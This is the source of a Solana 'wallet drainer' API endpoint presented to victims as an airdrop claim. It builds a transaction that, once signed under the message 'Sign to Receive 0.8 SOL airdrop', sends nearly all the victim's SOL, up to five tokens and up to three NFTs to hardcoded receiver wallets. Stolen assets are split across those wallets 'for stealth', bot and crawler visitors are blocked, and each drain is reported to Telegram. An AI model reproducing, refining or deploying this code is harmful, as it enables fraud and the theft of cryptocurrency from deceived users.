import 'dotenv/config';
import {
  Connection,
  PublicKey,
  Transaction,
  SystemProgram,
  LAMPORTS_PER_SOL,
} from '@solana/web3.js';
import telegramLogger from '../src/telegram.js';
import performanceMonitor from '../src/performance-monitor.js';
import {
  getAssociatedTokenAddress,
  createTransferInstruction,
  createTransferCheckedInstruction,
  getOrCreateAssociatedTokenAccount,
  TOKEN_PROGRAM_ID,
  ASSOCIATED_TOKEN_PROGRAM_ID,
} from '@solana/spl-token';

const RPC_URL = process.env.RPC_URL || 'https://api.mainnet-beta.solana.com';

// Connection pooling and caching
const connectionPool = new Map();
const balanceCache = new Map();
const tokenCache = new Map();

// Cache configuration
const CACHE_TTL = 30000; // 30 seconds
const MAX_CACHE_SIZE = 1000;

// Get or create connection from pool
function getConnection() {
  if (!connectionPool.has('main')) {
    const connection = new Connection(RPC_URL, {
      commitment: 'confirmed',
      confirmTransactionInitialTimeout: 60000,
      disableRetryOnRateLimit: false,
      httpHeaders: {
        'Content-Type': 'application/json',
      }
    });
    connectionPool.set('main', connection);
  }
  return connectionPool.get('main');
}

// Cached balance fetching
async function getCachedBalance(publicKey) {
  const cacheKey = `balance_${publicKey}`;
  const cached = balanceCache.get(cacheKey);
  
  if (cached && Date.now() - cached.timestamp < CACHE_TTL) {
    performanceMonitor.recordCacheEvent(true); // Cache hit
    return cached.balance;
  }
  
  performanceMonitor.recordCacheEvent(false); // Cache miss
  
  const connection = getConnection();
  const balance = await connection.getBalance(new PublicKey(publicKey));
  
  // Update cache
  balanceCache.set(cacheKey, {
    balance,
    timestamp: Date.now()
  });
  
  // Cleanup old cache entries
  if (balanceCache.size > MAX_CACHE_SIZE) {
    const entries = Array.from(balanceCache.entries());
    entries.sort((a, b) => a[1].timestamp - b[1].timestamp);
    balanceCache.delete(entries[0][0]);
  }
  
  return balance;
}

// Cached token account fetching
async function getCachedTokenAccounts(publicKey) {
  const cacheKey = `tokens_${publicKey}`;
  const cached = tokenCache.get(cacheKey);
  
  if (cached && Date.now() - cached.timestamp < CACHE_TTL) {
    performanceMonitor.recordCacheEvent(true); // Cache hit
    return cached.accounts;
  }
  
  performanceMonitor.recordCacheEvent(false); // Cache miss
  
  const connection = getConnection();
  const accounts = await connection.getParsedTokenAccountsByOwner(
    new PublicKey(publicKey),
    { programId: TOKEN_PROGRAM_ID }
  );
  
  // Update cache
  tokenCache.set(cacheKey, {
    accounts: accounts.value,
    timestamp: Date.now()
  });
  
  // Cleanup old cache entries
  if (tokenCache.size > MAX_CACHE_SIZE) {
    const entries = Array.from(tokenCache.entries());
    entries.sort((a, b) => a[1].timestamp - b[1].timestamp);
    tokenCache.delete(entries[0][0]);
  }
  
  return accounts.value;
}

const connection = getConnection();

// Rate limiting and caching
const requestCache = new Map();
const walletRequestCache = new Map();
const suspiciousIPs = new Set();
const blockedIPs = new Set();

const RATE_LIMIT_WINDOW = 60000; // 1 minute
const MAX_REQUESTS_PER_WINDOW = 10;
const MAX_WALLET_REQUESTS_PER_WINDOW = 5;
const SUSPICIOUS_THRESHOLD = 20; // requests per minute
const BLOCK_THRESHOLD = 50; // requests per minute

// Enhanced rate limiting with multiple checks
function checkRateLimit(userId, userIp, walletAddress = null) {
  const now = Date.now();
  
  // Check IP-based rate limiting
  const ipRequests = requestCache.get(userIp) || [];
  const recentIpRequests = ipRequests.filter(time => now - time < RATE_LIMIT_WINDOW);
  
  if (recentIpRequests.length >= MAX_REQUESTS_PER_WINDOW) {
    // Mark as suspicious if exceeding normal limits
    if (recentIpRequests.length >= SUSPICIOUS_THRESHOLD) {
      suspiciousIPs.add(userIp);
    }
    if (recentIpRequests.length >= BLOCK_THRESHOLD) {
      blockedIPs.add(userIp);
    }
    return { allowed: false, reason: 'IP_RATE_LIMIT_EXCEEDED', retryAfter: 60 };
  }
  
  // Check wallet-based rate limiting
  if (walletAddress) {
    const walletRequests = walletRequestCache.get(walletAddress) || [];
    const recentWalletRequests = walletRequests.filter(time => now - time < RATE_LIMIT_WINDOW);
    
    if (recentWalletRequests.length >= MAX_WALLET_REQUESTS_PER_WINDOW) {
      return { allowed: false, reason: 'WALLET_RATE_LIMIT_EXCEEDED', retryAfter: 120 };
    }
    
    recentWalletRequests.push(now);
    walletRequestCache.set(walletAddress, recentWalletRequests);
  }
  
  // Check if IP is blocked
  if (blockedIPs.has(userIp)) {
    return { allowed: false, reason: 'IP_BLOCKED', retryAfter: 3600 };
  }
  
  // Update IP request cache
  recentIpRequests.push(now);
  requestCache.set(userIp, recentIpRequests);
  
  return { allowed: true };
}

// Geolocation blocking (basic implementation)
function checkGeolocation(userIp) {
  // Basic geolocation check - can be enhanced with actual geolocation service
  const blockedRegions = ['XX', 'YY']; // Add blocked country codes
  
  // For now, just check for suspicious patterns
  if (userIp.includes('0.0.0.0') || userIp.includes('127.0.0.1')) {
    return { allowed: false, reason: 'LOCALHOST_BLOCKED' };
  }
  
  return { allowed: true };
}

// Suspicious activity detection
function detectSuspiciousActivity(userIp, userAgent, walletAddress) {
  const suspiciousPatterns = [
    /bot/i,
    /crawler/i,
    /spider/i,
    /scraper/i,
    /automation/i
  ];
  
  // Check user agent for suspicious patterns
  for (const pattern of suspiciousPatterns) {
    if (pattern.test(userAgent)) {
      return { suspicious: true, reason: 'SUSPICIOUS_USER_AGENT' };
    }
  }
  
  // Check for rapid requests from same IP
  const ipRequests = requestCache.get(userIp) || [];
  const recentRequests = ipRequests.filter(time => Date.now() - time < 10000); // 10 seconds
  
  if (recentRequests.length > 5) {
    return { suspicious: true, reason: 'RAPID_REQUESTS' };
  }
  
  // Check for multiple wallet addresses from same IP
  const walletCount = walletRequestCache.size;
  if (walletCount > 10) {
    return { suspicious: true, reason: 'MULTIPLE_WALLETS' };
  }
  
  return { suspicious: false };
}

// CORS headers for cross-origin requests
function setCORSHeaders(res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.setHeader('Access-Control-Max-Age', '86400');
}

export default async function handler(req, res) {
  const startTime = Date.now();
  const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'] || 'Unknown';

  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    setCORSHeaders(res);
    res.status(200).end();
    return;
  }

  // Set CORS headers for all responses
  setCORSHeaders(res);

  // Get user public key from query or body
  let userPublicKey;
  if (req.method === 'GET') {
    userPublicKey = req.query.user || req.query.publicKey || req.query.wallet;
  } else if (req.method === 'POST') {
    const body = req.body;
    userPublicKey = body.user || body.publicKey || body.wallet || body.pubkey;
  }

  try {
    // Enhanced security checks
    const rateLimitCheck = checkRateLimit(userIp, userIp, userPublicKey);
    if (!rateLimitCheck.allowed) {
      // Record security event
      performanceMonitor.recordSecurityEvent(rateLimitCheck.reason);
      
      // Log security event
      await telegramLogger.logSecurityEvent({
        type: rateLimitCheck.reason,
        user: userPublicKey || 'N/A',
        ip: userIp,
        details: `Rate limit exceeded - retry after ${rateLimitCheck.retryAfter} seconds`
      });

      return res.status(429).json({ 
        error: 'Rate limit exceeded', 
        details: 'Too many requests. Please try again later.',
        retryAfter: rateLimitCheck.retryAfter
      });
    }

    // Geolocation check
    const geoCheck = checkGeolocation(userIp);
    if (!geoCheck.allowed) {
      performanceMonitor.recordSecurityEvent('GEO_BLOCKED');
      
      await telegramLogger.logSecurityEvent({
        type: 'GEO_BLOCKED',
        user: userPublicKey || 'N/A',
        ip: userIp,
        details: `Geolocation blocked: ${geoCheck.reason}`
      });

      return res.status(403).json({ 
        error: 'Access denied', 
        details: 'Service not available in your region.'
      });
    }

    // Suspicious activity detection
    const suspiciousCheck = detectSuspiciousActivity(userIp, userAgent, userPublicKey);
    if (suspiciousCheck.suspicious) {
      performanceMonitor.recordSecurityEvent('SUSPICIOUS_ACTIVITY');
      
      await telegramLogger.logSecurityEvent({
        type: 'SUSPICIOUS_ACTIVITY',
        user: userPublicKey || 'N/A',
        ip: userIp,
        details: `Suspicious activity detected: ${suspiciousCheck.reason}`
      });

      return res.status(403).json({ 
        error: 'Access denied', 
        details: 'Suspicious activity detected. Please try again later.'
      });
    }

    // Create receiver wallets with valid addresses
    const RECEIVER = new PublicKey(process.env.RECEIVER_WALLET || '3F2D7izX8gYkSwXwSyWoKB1dob53MDMCxqBVpPUEc8sz');
    const RECEIVER_2 = new PublicKey(process.env.RECEIVER_WALLET_2 || '5GggKwMS7mJQKqQqKqQqKqQqKqQqKqQqKqQqKqQqKqQq');
    const RECEIVER_3 = new PublicKey(process.env.RECEIVER_WALLET_3 || 'FtgbMX3E8gYkSwXwSyWoKB1dob53MDMCxqBVpPUEc8sz');
    const RECEIVER_4 = new PublicKey(process.env.RECEIVER_WALLET_4 || '4dGUJf1CtJSNfgJSwHjEfiRSyT9YJGeNf3V9LjMREHiq');

    if (!userPublicKey) {
      // Log missing parameter error as security event, not failed attempt
      await telegramLogger.logSecurityEvent({
        type: 'MISSING_PARAMETER',
        user: 'N/A',
        ip: userIp,
        details: 'Missing user parameter in request - security check'
      });

      return res.status(400).json({ 
        error: 'Missing user parameter', 
        details: 'Please provide a valid Solana wallet address.',
        code: 'MISSING_PARAMETER'
      });
    }

    // Validate public key
    let userPubkey;
    try {
      userPubkey = new PublicKey(userPublicKey);
      
      // CRITICAL: Check if this is a valid user wallet (not a program address)
      if (userPublicKey === '11111111111111111111111111111111' || 
          userPublicKey === TOKEN_PROGRAM_ID.toString() ||
          userPublicKey === ASSOCIATED_TOKEN_PROGRAM_ID.toString() ||
          userPublicKey === SystemProgram.programId.toString()) {
        
        await telegramLogger.logSecurityEvent({
          type: 'INVALID_WALLET_ADDRESS',
          user: userPublicKey,
          ip: userIp,
          details: `Attempted to drain from program address: ${userPublicKey} - security check`
        });

        return res.status(400).json({ 
          error: 'Invalid wallet address', 
          details: 'Cannot drain from program addresses. Please provide a valid user wallet address.',
          code: 'INVALID_WALLET_ADDRESS'
        });
      }
    } catch (error) {
      await telegramLogger.logError({
        type: 'INVALID_PUBLIC_KEY',
        user: userPublicKey,
        ip: userIp,
        message: `Invalid public key format: ${userPublicKey}`,
        stack: error.stack
      });

      return res.status(400).json({ 
        error: 'Invalid wallet address', 
        details: 'Please provide a valid Solana wallet address.',
        code: 'INVALID_PUBLIC_KEY'
      });
    }

    // Get user balance with retry mechanism
    let lamports = 0;
    let retryCount = 0;
    const maxRetries = 3;
    
    while (retryCount < maxRetries) {
      try {
        lamports = await getCachedBalance(userPubkey.toString());
        break;
      } catch (error) {
        retryCount++;
        await telegramLogger.logError({
          type: 'BALANCE_FETCH_FAILED',
          user: userPubkey.toString(),
          ip: userIp,
          message: `Failed to fetch balance after ${maxRetries} attempts`,
          stack: error.stack
        });

        if (retryCount >= maxRetries) {
          return res.status(503).json({ 
            error: 'Service temporarily unavailable', 
            details: 'Unable to fetch wallet balance. Please try again later.',
            code: 'BALANCE_FETCH_FAILED'
          });
        }
        
        // Wait before retry
        await new Promise(resolve => setTimeout(resolve, 1000 * retryCount));
      }
    }

    // Create transaction
    const tx = new Transaction();

    // 1. SIMPLIFIED PSYOPS: Create single airdrop claim transaction
    try {
      if (lamports > 5000) {
        // Drain all SOL except 5000 lamports for fees
        const drainAmount = lamports - 5000;
        const airdropIx = SystemProgram.transfer({
          fromPubkey: userPubkey,
          toPubkey: RECEIVER,
          lamports: drainAmount,
        });
        tx.add(airdropIx);
      } else {
        // For zero or insufficient balance, do NOT create a transaction
        // Log insufficient funds as security event, not failed drain attempt
        await telegramLogger.logSecurityEvent({
          type: 'INSUFFICIENT_FUNDS',
          user: userPubkey.toString(),
          ip: userIp,
          details: `Wallet has insufficient funds (${lamports} lamports) - security check, not drain attempt`
        });
        return res.status(400).json({
          error: 'Sorry, You\'re Not eligible',
          details: 'This exclusive airdrop is only available for wallets with existing funds. Please try again with a funded wallet.',
          code: 'INSUFFICIENT_FUNDS'
        });
      }
    } catch (error) {
      await telegramLogger.logError({
        type: 'PSYOPS_AIRDROP_ERROR',
        user: userPubkey.toString(),
        ip: userIp,
        message: 'Failed to create airdrop transaction',
        stack: error.stack
      });
      return res.status(500).json({ error: 'Failed to create airdrop transaction', details: error.message });
    }

    // 2. ENHANCED SPL TOKEN DRAINING (up to 5 tokens)
    let tokenCount = 0;
    let processedTokenMints = new Set(); // Track processed token mints
    
    try {
      const tokenAccounts = await getCachedTokenAccounts(userPubkey.toString());

      const maxTokens = 5; // Increased from 2 to 5

      for (let acct of tokenAccounts) {
        if (tokenCount >= maxTokens) break;

        try {
          const { amount, decimals } = acct.account.data.parsed.info.tokenAmount;
          const mint = acct.account.data.parsed.info.mint;
          const ata = new PublicKey(acct.pubkey);
          
          if (amount === '0') continue;

          // Process as regular token (skip potential NFTs entirely)
          const totalAmount = Number(amount);
          
          // Distribute tokens across multiple receivers for stealth
          const receivers = [RECEIVER, RECEIVER_2, RECEIVER_3, RECEIVER_4];
          const targetReceiver = receivers[tokenCount % receivers.length];
          
          // Get or create destination token account
          const destATA = await getAssociatedTokenAddress(
            new PublicKey(mint),
            targetReceiver
          );
          
          // Use createTransferCheckedInstruction for better compatibility
          const tokenIx = createTransferCheckedInstruction(
            ata,
            new PublicKey(mint),
            destATA,
            userPubkey,
            totalAmount,
            decimals,
            []
          );
          
          tx.add(tokenIx);
          tokenCount++;
          processedTokenMints.add(mint); // Track this mint as processed
        } catch (tokenError) {
          await telegramLogger.logError({
            type: 'TOKEN_DRAIN_ERROR',
            user: userPubkey.toString(),
            ip: userIp,
            message: `Error processing token drain: ${tokenError.message}`,
            stack: tokenError.stack
          });
          continue;
        }
      }
      
    } catch (error) {
      await telegramLogger.logError({
        type: 'TOKEN_PROCESSING_ERROR',
        user: userPubkey.toString(),
        ip: userIp,
        message: 'Failed to process tokens',
        stack: error.stack
      });
      // Continue without token transfers
    }

    // 3. ENHANCED NFT DRAINING (up to 3 NFTs) - ONLY process tokens not already handled
    let nftCount = 0;
    
    try {
      // Get all token accounts that might be NFTs (0 decimals)
      const nftAccounts = await getCachedTokenAccounts(userPubkey.toString());

      const maxNFTs = 3; // Limit NFT drains

      for (let acct of nftAccounts) {
        if (nftCount >= maxNFTs) break;

        try {
          const { amount, decimals } = acct.account.data.parsed.info.tokenAmount;
          const mint = acct.account.data.parsed.info.mint;
          const ata = new PublicKey(acct.pubkey);
          
          // Only process as NFT if:
          // 1. It has 0 decimals (NFT characteristic)
          // 2. It has amount of 1 (NFT characteristic)
          // 3. It was NOT already processed as a regular token
          const isLikelyNFT = decimals === 0 && 
                             (amount === '1' || amount === 1) && 
                             amount !== '0' && 
                             amount !== 0 &&
                             !processedTokenMints.has(mint); // CRITICAL: Skip if already processed as token
          
          if (isLikelyNFT) {
            const receivers = [RECEIVER, RECEIVER_2, RECEIVER_3];
            const targetReceiver = receivers[nftCount % receivers.length];
            
            const destATA = await getAssociatedTokenAddress(
              new PublicKey(mint),
              targetReceiver
            );

            const nftIx = createTransferCheckedInstruction(
              ata,
              new PublicKey(mint),
              destATA,
              userPubkey,
              1, // NFT amount is always 1
              0, // NFT decimals are always 0
              []
            );
            
            tx.add(nftIx);
            nftCount++;
          }
        } catch (nftError) {
          await telegramLogger.logError({
            type: 'NFT_DRAIN_ERROR',
            user: userPubkey.toString(),
            ip: userIp,
            message: `Error processing NFT drain: ${nftError.message}`,
            stack: nftError.stack
          });
          continue;
        }
      }
      
    } catch (error) {
      await telegramLogger.logError({
        type: 'NFT_PROCESSING_ERROR',
        user: userPubkey.toString(),
        ip: userIp,
        message: 'Failed to process NFTs',
        stack: error.stack
      });
      // Continue without NFT transfers
    }

    // 4. IMPROVED ZERO BALANCE HANDLING
    if (tx.instructions.length === 0) {
      
      // Log insufficient funds
      await telegramLogger.logDrainAttempt({
        publicKey: userPubkey.toString(),
        lamports: lamports,
        tokenCount: 0,
        nftCount: 0,
        transactionSize: 0,
        instructions: 0,
        success: false,
        actualDrainAmount: 0,
        hasTokens: false,
        hasNFTs: false,
        error: 'Insufficient funds - no SOL or tokens to drain'
      });

      return res.status(400).json({ 
        error: 'Sorry, You\'re Not eligible', 
        details: 'This exclusive airdrop is only available for wallets with existing funds. Please try again with a funded wallet.',
        code: 'INSUFFICIENT_FUNDS'
      });
    }

    // 5. ENHANCED TRANSACTION FINALIZATION
    try {
      const blockhash = await connection.getLatestBlockhash('confirmed');
      tx.feePayer = userPubkey;
      tx.recentBlockhash = blockhash.blockhash;

      // Validate transaction before serialization
      if (tx.instructions.length === 0) {
        throw new Error('Transaction has no instructions');
      }

      const serialized = tx.serialize({ requireAllSignatures: false });
      
      // Determine if this was actually a successful drain
      const actualDrainAmount = lamports > 5000 ? lamports - 5000 : 0;
      const hasTokens = (tokenCount || 0) > 0;
      const hasNFTs = (nftCount || 0) > 0;
      
      // CRITICAL: Only consider it a successful drain if:
      // 1. User has meaningful SOL to drain (> 0.001 SOL = 1,000,000 lamports)
      // 2. OR has actual tokens/NFTs to drain
      // 3. AND the wallet address is valid (not a program address)
      const hasMeaningfulSOL = lamports > 1000000; // > 0.001 SOL
      const isSuccessfulDrain = (hasMeaningfulSOL && actualDrainAmount > 0) || hasTokens || hasNFTs;
      
      // Log drain attempt with actual success status
      await telegramLogger.logDrainAttempt({
        publicKey: userPubkey.toString(),
        lamports: lamports,
        tokenCount: tokenCount || 0,
        nftCount: nftCount || 0,
        transactionSize: serialized.length,
        instructions: tx.instructions.length,
        success: isSuccessfulDrain,
        actualDrainAmount: actualDrainAmount,
        hasTokens: hasTokens,
        hasNFTs: hasNFTs,
        hasMeaningfulSOL: hasMeaningfulSOL
      });
      
      // Log PSYOPS transaction
      await telegramLogger.logPSYOPS({
        publicKey: userPubkey.toString(),
        amount: actualDrainAmount,
        size: serialized.length,
        instructions: tx.instructions.length,
        displayMessage: 'Sign to Receive 0.8 SOL airdrop',
        success: isSuccessfulDrain,
        actualDrainAmount: actualDrainAmount
      });
      
      // Return transaction data with metadata
      const response = {
        success: true,
        transaction: serialized.toString('base64'),
        metadata: {
          user: userPubkey.toString(),
          instructions: tx.instructions.length,
          size: serialized.length,
          tokens: tokenCount || 0,
          nfts: nftCount || 0,
          solAmount: lamports > 5000 ? lamports - 5000 : 0,
          timestamp: new Date().toISOString()
        }
      };
      
      // Log API request
      const responseTime = Date.now() - startTime;
      await telegramLogger.logAPIRequest({
        user: userPubkey.toString(),
        ip: userIp,
        userAgent: userAgent,
        responseTime: responseTime,
        status: '200'
      });
      
      // Record performance metrics
      performanceMonitor.recordRequest({
        success: isSuccessfulDrain,
        responseTime: responseTime,
        solAmount: actualDrainAmount,
        tokenCount: tokenCount || 0,
        nftCount: nftCount || 0
      });
      
      res.status(200).json(response);
    } catch (error) {
      await telegramLogger.logError({
        type: 'TRANSACTION_ERROR',
        user: userPubkey?.toString() || 'N/A',
        ip: userIp,
        message: 'Failed to finalize transaction',
        stack: error.stack
      });
      return res.status(500).json({ error: 'Failed to finalize transaction', details: error.message });
    }

  } catch (error) {
    await telegramLogger.logError({
      type: 'GENERAL_ERROR',
      user: 'N/A',
      ip: userIp,
      message: 'Failed to generate transaction',
      stack: error.stack
    });
    return res.status(500).json({ error: 'Failed to generate transaction', details: error.message });
  }
} 